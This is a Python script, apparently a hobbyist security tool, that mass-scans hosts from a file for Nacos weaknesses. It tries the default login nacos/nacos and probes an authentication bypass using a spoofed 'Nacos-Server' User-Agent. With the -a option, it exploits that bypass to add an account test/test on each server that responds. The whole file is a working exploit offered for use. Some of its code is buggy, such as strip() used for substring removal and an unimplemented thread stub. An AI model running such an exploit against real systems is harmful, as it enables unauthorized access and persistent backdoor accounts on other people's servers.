# @Author: Tommonkey
# @Data: 2022/6/2
# @Blog: https://www.tommonkey.cn


import requests
import time
import argparse
import socket
from threading import Thread


def args_deal():
    parse = argparse.ArgumentParser(prog="T-Nacos.py", description='''\033[5;31;44mThis program is used to probe the Nacos service for vulnerabilities  Example: python3 TNacos.py -u 1.1.1.1   =================Author:Tommonkey\033[0m''')
    parse.add_argument("-f","--file",action="store",help="Batch read URLs")
    parse.add_argument("-a",action="store_true",help="Add a new account: test/test")
    opt = parse.parse_args()
    return opt


def input_data(path):
    List = []
    with open(r"{}".format(path), encoding="utf=8") as f:
        for u in f.readlines():
            print(u)
            u = u.strip("\n")
            endpoint = u[-6::]
            if "nacos" in endpoint:
                u = u.strip("/nacos")
            if "https" in u:
                u = u.replace("https://","")
            if "http" in u:
                print(u)
                u = u.replace("http://","")
                print(u)
            if ":8848" in u:
                u = u.strip("8848")
                u = u.strip(":")
            List.append(u)
        print(List)
        return List


def detect_weakPasswd(urls):
    weak = []
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
    }
    data = {
        "username":"nacos","password":"nacos"
    }
    with open(r"./weakPasswd.txt","a+",encoding="utf-8") as w:          # current directory to create file of weakPasswd.txt
        for url in urls:
            print("Detecting {}...please keep patience!".format(url))
            try:
                url1 = "http://"+url+":8848/nacos/v1/auth/users/login"
                weak.append(url1)
                content1 = requests.post(url1,headers=headers,data=data)
                if content1.status_code == 200:
                    print("\033[5;31;44m+++\033[0m"+url1+" has a weak password loophole!")
                    w.write(url1+"\n")
                    content1.keep_live = False
                time.sleep(1)
                url2 = "https://"+url + ":8848/nacos/v1/auth/users/login"
                weak.append(url2)
                content2 = requests.post(url2, headers=headers, data=data)
                if content2.status_code == 200:
                    print("\033[5;31;44m+++\033[0m"+url2+" has a weak password loophole!!!")
                    w.write(url2+"\n")
                    content2.keep_live = False
                time.sleep(1)
                url3 = "http://"+url
                weak.append(url3)
                content3 = requests.post(url3, headers=headers, data=data)
                if content3.status_code == 200:
                    print("\033[5;31;44m+++\033[0m "+"http://"+url+" has a weak password loophole!!!")
                    w.write(url3+"\n")
                    content3.keep_live = False
                time.sleep(1)
                url4 = "https://"+url
                weak.append(url4)
                content4 = requests.post(url4, headers=headers, data=data)
                if content4.status_code == 200:
                    print("\033[5;31;44m+++\033[0m "+url4+" has a weak password loophole!!!")
                    w.write(url4+"\n")
                    content4.keep_live = False
            except Exception as err:
                pass
            print("{} doesn't exist leak".format(url))
            continue
        return weak


def detect_perBypass(list):
    print("Start detect permission bypass......")
    headers = {
        "User-Agent": "Nacos-Server"
    }
    byPass = []
    with open(r"./PerBypass.txt","a+",encoding="utf-8") as w:
        for p in list:
            try:
                if "v1/auth/users/login" in p:
                    p = p.replace("/nacos/v1/auth/users/login","/nacos/v1/auth/users?pageNo=1&pageSize=9")
                    content = requests.get(p,headers=headers)
                else:
                    p = p+"/nacos/v1/auth/users?pageNo=1&pageSize=9"
                    content = requests.get(p, headers=headers)
                if content.status_code == 200 and "pageItems" in content.text:
                    print("\033[5;31;44m+++\033[0m"+" {} has a Permission bypass loophole!".format(p))
                    w.write(p+"\n")
                    byPass.append(p)
                else:
                    print("{} doesn't exist leak!".format(p))
            except Exception as err:
                pass
            continue
    return byPass


def addUser_model(list):
    print("Start add a new user account......")
    headers = {
        "User-Agent": "Nacos-Server"
    }
    with open(r"./addUser.txt","a+",encoding="utf-8") as w:
        for u in list:
            u = u.replace("/nacos/v1/auth/users?pageNo=1&pageSize=9","/nacos/v1/auth/users?username=test&password=test")
            content = requests.post(u, headers=headers)
            if content.status_code == 200 and "create user ok" in content.text:
                print("Add User Success,New User Info: test/test")
                w.write(u+'\n')
            else:
                print("{} Add User Failed".format(u))


def thread_deal():
    pass


if __name__ == "__main__":
    socket.setdefaulttimeout(8)
    start_time = time.strftime('%Y-%M-%d %H:%M:%S')
    judge = args_deal()
    if judge.file is None:
        print("Please input file's absolute path!!!")
    else:
        urls = input_data(judge.file)          # return type is list
        weak_list = detect_weakPasswd(urls)
        bypass_list = detect_perBypass(weak_list)
    if judge.a is True:
        addUser_model(bypass_list)
    print("############################################")
    print("100%")
